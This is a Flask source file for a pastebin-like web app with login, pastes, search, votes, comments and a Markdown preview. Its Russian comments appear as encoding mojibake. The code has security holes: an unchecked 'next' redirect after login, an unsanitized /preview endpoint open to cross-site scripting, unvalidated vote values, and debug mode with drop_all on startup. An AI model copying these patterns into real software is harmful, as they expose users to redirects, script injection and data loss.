# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å—Å—ã–ª–∫–∏ Clickbait
@app.route('/clickbait/generate')
def generate_link():
    clickbait = Clickbait.query.first()
    if clickbait:
        return f"–í–æ—Ç –≤–∞—à–∞ —Å—Å—ã–ª–∫–∞ clickbait: {url_for('clickbait_page', _external=True)}"
    else:
        return "Clickbait –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω.", 404

@app.route('/register', methods=['GET', 'POST'])
@limiter.limit("5 per minute")
def register():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = RegistrationForm()
    if form.validate_on_submit():
        user = User(
            username=form.username.data,
            email=form.email.data if form.email.data else None  # –°–æ—Ö—Ä–∞–Ω–∏—Ç—å None, –µ—Å–ª–∏ email –ø—É—Å—Ç–æ–π
        )
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–æ–π–¥–∏—Ç–µ.', 'success')
        return redirect(url_for('login'))
    return render_template('register.html', form=form)

# –°—Ç—Ä–∞–Ω–∏—Ü–∞ –≤—Ö–æ–¥–∞
@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user and user.check_password(form.password.data):
            if user.is_banned:
                flash("–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –∑–∞–±–∞–Ω–µ–Ω.", "danger")
                return redirect(url_for('login'))
            login_user(user)
            flash('–í—ã —É—Å–ø–µ—à–Ω–æ –≤–æ—à–ª–∏ –≤ —Å–∏—Å—Ç–µ–º—É.', 'success')
            next_page = request.args.get('next')
            return redirect(next_page) if next_page else redirect(url_for('index'))
        else:
            flash('–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å.', 'danger')
    return render_template('login.html', form=form)

# –í—ã—Ö–æ–¥
@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('–í—ã –≤—ã—à–ª–∏ –∏–∑ —Å–∏—Å—Ç–µ–º—ã.', 'info')
    return redirect(url_for('index'))

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–∞–Ω–∏—Ç–∞–π–∑–∏–Ω–≥–∞ HTML –∫–æ–Ω—Ç–µ–Ω—Ç–∞
def sanitize_html(content):
    tags = [
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'b', 'i', 'strong', 'em', 'a', 'p', 'ul', 'ol', 'li',
        'blockquote', 'code', 'pre', 'hr', 'br', 'table', 'thead', 'tbody', 'tr', 'th', 'td'
    ]
    attributes = {
        'a': ['href', 'title'],
        'img': ['src', 'alt'],
    }
    return bleach.clean(content, tags=tags, attributes=attributes, strip=True)

# –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ Paste (—Ç–æ–ª—å–∫–æ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)
@app.route('/create', methods=['GET', 'POST'])
@login_required
def create_paste():
    form = PasteForm()
    if form.validate_on_submit():
        content = request.form['content']
        # –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è Markdown –≤ HTML —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è–º–∏
        html_content = markdown.markdown(
            content,
            extensions=[
                TocExtension(),
                CodeHiliteExtension(),
                'markdown.extensions.extra'
            ]
        )
        # –°–∞–Ω–∏—Ç–∞–π–∑–∏–Ω–≥ HTML –∫–æ–Ω—Ç–µ–Ω—Ç–∞
        safe_html_content = sanitize_html(html_content)

        paste = Paste(
            title=form.title.data,
            content=safe_html_content,
            author=current_user,
            is_anonymous=form.is_anonymous.data,
            language=form.language.data,
            tags=[Tag.query.get(tag_id) for tag_id in form.tags.data]
        )
        db.session.add(paste)
        db.session.commit()
        flash('–ù–æ–≤—ã–π Paste —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω!', 'success')
        return redirect(url_for('index'))
    form.tags.choices = [(tag.id, tag.name) for tag in Tag.query.all()]
    return render_template('create.html', form=form)

# –ü—Ä–æ—Å–º–æ—Ç—Ä –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ Paste
@app.route('/paste/<int:paste_id>')
def view_paste(paste_id):
    paste = Paste.query.get_or_404(paste_id)
    lexer = get_lexer_by_name(paste.language, stripall=True)
    formatter = HtmlFormatter(linenos=True, cssclass="codehilite")
    highlighted = highlight(paste.content, lexer, formatter)
    return render_template('paste.html', paste=paste, content=highlighted)

# –ü–æ–∏—Å–∫ –ø–æ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º/–∫–æ–Ω—Ç–µ–Ω—Ç—É
@app.route('/search')
def search():
    query = request.args.get('query', '')
    results = Paste.query.filter(
        Paste.title.ilike(f'%{query}%') |
        Paste.content.ilike(f'%{query}%')
    ).all()
    return render_template('search.html', results=results)

# –§–∏–ª—å—Ç—Ä—ã –ø–æ —è–∑—ã–∫–∞–º/–¥–∞—Ç–µ/–∞–≤—Ç–æ—Ä–∞–º
@app.route('/pastes')
def pastes():
    language = request.args.get('language')
    date = request.args.get('date')
    query = Paste.query
    if language:
        query = query.filter_by(language=language)
    if date:
        query = query.filter(Paste.created_at >= date)
    return render_template('pastes.html', pastes=query.all())

# –õ–∞–π–∫–∏/–¥–∏–∑–ª–∞–π–∫–∏
@app.route('/vote/<int:paste_id>/<int:value>', methods=['POST'])
@login_required
def vote(paste_id, value):
    vote = Vote.query.filter_by(user_id=current_user.id, paste_id=paste_id).first()
    if vote:
        vote.value = value
    else:
        vote = Vote(user_id=current_user.id, paste_id=paste_id, value=value)
        db.session.add(vote)
    db.session.commit()
    paste = Paste.query.get_or_404(paste_id)
    likes = db.session.query(db.func.count()).filter_by(paste_id=paste_id, value=1).scalar()
    dislikes = db.session.query(db.func.count()).filter_by(paste_id=paste_id, value=-1).scalar()
    return jsonify({'likes': likes, 'dislikes': dislikes})

# –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ —Å @—É–ø–æ–º–∏–Ω–∞–Ω–∏—è–º–∏
@app.route('/comment/<int:paste_id>', methods=['POST'])
@login_required
def comment(paste_id):
    text = request.form['text']
    comment = Comment(text=text, user_id=current_user.id, paste_id=paste_id)
    db.session.add(comment)
    db.session.commit()

    # –û–±—Ä–∞–±–æ—Ç–∫–∞ —É–ø–æ–º–∏–Ω–∞–Ω–∏–π
    mentioned_users = re.findall(r'@(\w+)', text)
    for username in mentioned_users:
        user = User.query.filter_by(username=username).first()
        if user:
            send_notification(user, f"–í–∞—Å —É–ø–æ–º—è–Ω—É–ª–∏ –≤ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏: {text}")

    return redirect(url_for('view_paste', paste_id=paste_id))

# –®–∞—Ä–∏–Ω–≥ –≤ —Å–æ—Ü—Å–µ—Ç–∏
@app.route('/share/<int:paste_id>')
def share(paste_id):
    paste = Paste.query.get_or_404(paste_id)
    return render_template('share.html', paste=paste)

# –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –ø–∞—Å—Ç—ã
@app.route('/preview', methods=['POST'])
def preview():
    content = request.json.get('content', '')
    return markdown.markdown(content)

def create_tables():
    retries = 5
    while retries > 0:
        try:
            db.create_all()
            print("–¢–∞–±–ª–∏—Ü—ã —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω—ã.")
            break
        except OperationalError as e:
            print(f"OperationalError: {e}")
            retries -= 1
            if retries > 0:
                print("–ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...")
                time.sleep(2)  # –ü–æ–¥–æ–∂–¥–∞—Ç—å –ø–µ—Ä–µ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–æ–π
            else:
                print("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ—Å–ª–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –ø–æ–ø—ã—Ç–æ–∫.")
                raise

if __name__ == '__main__':
    with app.app_context():
        db.drop_all()  # –£–¥–∞–ª–∏—Ç—å –≤—Å–µ —Ç–∞–±–ª–∏—Ü—ã
        db.create_all()  # –°–æ–∑–¥–∞—Ç—å –∑–∞–Ω–æ–≤–æ —Å –Ω–æ–≤—ã–º–∏ –ø–æ–ª—è–º–∏
        app.run(debug=True)